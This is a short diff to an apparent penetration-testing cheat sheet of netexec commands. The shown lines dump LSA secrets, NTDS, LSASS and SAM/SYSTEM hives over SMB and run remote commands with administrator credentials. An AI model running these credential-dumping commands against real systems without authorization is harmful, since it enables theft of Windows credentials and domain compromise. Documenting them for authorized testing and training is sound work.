@@ -3338,7 +3338,10 @@ netexec smb <ip> --local-auth -u <username> -p <password> --lsa
 netexec smb <ip> -u <username> -p <password> --ntds
 
 # Uses netexec in conjunction with admin credentials to dump LSASS
-netexec  smb <ip> -u <username> -p <password> -M lsassy
+netexec smb <ip> -u <username> -p <password> -M lsassy
+
+# Uses netexec in conjunction with  credentials to dump SAM,SYSTEM,NTDS (need have priv SeBackupPrivilege and SeRestorePrivilege)
+netexec smb <ip> -u <username> -p <password> -M backup_operator
 
 # Execute a command over the SMB service using netexec.
 netexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
